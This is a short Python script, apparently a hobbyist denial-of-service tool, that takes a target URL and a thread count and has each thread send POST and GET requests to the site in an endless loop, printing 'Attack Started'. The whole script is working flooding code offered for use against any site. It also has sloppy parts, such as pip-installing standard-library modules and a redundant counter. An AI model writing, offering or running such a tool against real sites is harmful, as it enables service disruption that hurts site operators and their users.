import os

print("Installing colorama, threading, requests, time...")

os.system("pip install colorama threading requests time")

print("Installed colorama, threading? requests, time!")

print("Starting...")

import requests

from colorama import Fore as f

from threading import Thread

url = input('Url: ')

thrnom = input('Threads: ')

num = 0

def ddos():

    global num

    

    while True:

        

        spam = requests.post(url)

        

        spam2 = requests.get(url)

        

        if num == 1:

            

            num = 1

            

        else:

            

            print(f'{f.YELLOW}======>Attack Started<======')

            num = 1

        

for i in range(int(thrnom)):

    thr = Thread(target = ddos)

    thr.start()
